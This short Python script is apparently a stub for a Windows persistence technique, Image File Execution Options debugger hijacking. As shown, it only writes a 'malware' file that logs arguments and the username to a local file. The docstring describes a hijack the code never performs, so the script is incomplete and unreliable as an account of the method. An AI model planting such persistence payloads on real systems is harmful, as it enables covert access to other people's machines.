
def image_file_execution_option(process_name, malware_path):
    """
    This persistency method can also be viewed as privelge escalation method
    This feature in windows let's us run our code as a dubugger to whatever process we choose
    """

    malware_content = """import sys, os, datetime
os.system(f"echo '\\n-- {datetime.datetime.now()} --' >> findings.txt")
os.system(f"echo 'Arguments: {str(sys.argv)}' >> findings.txt")
os.system(f"echo 'User Name: %username%' >> findings.txt")
"""
    new_malware = open(malware_path, "w")
    new_malware.write(malware_content)
    new_malware.close()


def main():
    image_file_execution_option("cmd.exe", "recon.py")


if __name__ == "__main__":
    main()
